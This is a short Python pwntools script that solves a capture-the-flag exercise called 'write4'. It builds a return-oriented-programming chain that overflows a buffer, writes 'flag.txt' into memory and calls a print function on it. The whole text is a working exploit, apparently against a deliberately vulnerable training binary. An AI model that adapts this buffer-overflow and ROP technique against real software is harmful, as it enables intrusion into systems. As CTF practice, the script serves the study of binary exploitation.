from pwn import *
r = process("./write4")

def asscii2hex(value):
    result = ""
    for i in value:
        result += hex(ord(i))[2:]
    return result

def toAddr(value):
    length = len(value)
    result = "0x"
    for i in range(length-1, 0, -2):
        result += value[i-1] + value[i]
    return result

def process(value):
    return int(toAddr(asscii2hex(value)), 16)



pop = 0x0000000000400690
mov = 0x400628
r14 = 0x601030
r15 = process("flag.txt")
pop_rdi = 0x0000000000400693
printf_file = 0x0000000000400620

payload = b'a'*40
payload += p64(pop)
payload += p64(r14) + p64(r15)
payload += p64(mov)
payload += p64(pop_rdi)
payload += p64(r14)
payload += p64(printf_file)
print(payload)
r.sendafter(b'> ', payload)

r.interactive()